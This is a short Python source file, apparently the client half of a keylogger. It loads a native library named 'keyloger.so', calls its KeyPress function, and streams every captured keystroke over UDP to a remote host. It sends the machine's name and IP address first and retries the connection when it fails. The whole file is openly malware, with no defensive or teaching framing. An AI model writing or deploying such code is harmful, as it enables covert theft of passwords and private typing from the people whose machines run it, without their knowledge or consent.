import socket
import time
import ctypes

clibery = ctypes.CDLL("C:/Users/jomig/OneDrive/Ambiente de Trabalho/JNI/keyloger.so")
func = clibery.KeyPress
func.restype = ctypes.c_char_p

hostname = "TheoGeometric" #Put server hostanem HERE
#hostname = "iPad-de-Jose"
serverAddressPort   = (socket.gethostbyname(hostname), 200) #or put server IP HERE (IP, PORT)
bufferSize          = 1024
# Create a UDP socket at client side
UDPClientSocket = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
# Send to server using created UDP socket

info = "\n\033[0;33mPC info:\033[0;37m\n\033[0;36mPC name -> \033[0;37m" + socket.gethostname() + "\033[0;32m\nPCIPv4 -> \033[0;37m" + socket.gethostbyname(hostname) + "\n"

def SendMe(x):
    UDPClientSocket.sendto(str.encode(x), serverAddressPort)
    UDPClientSocket.settimeout(2)
    try:
        msgFromServer = UDPClientSocket.recvfrom(bufferSize)
        #print(msgFromServer)
    except socket.timeout:
        print("Server OFF")

def Connect():
    try:
        SendMe(info)
    except:
        print("Err de conexeção. Nova tentativa daqui a 5 segundos.")
        time.sleep(5)
        Connect()

Connect()

while (True):
    SendMe(func().decode("utf-8"))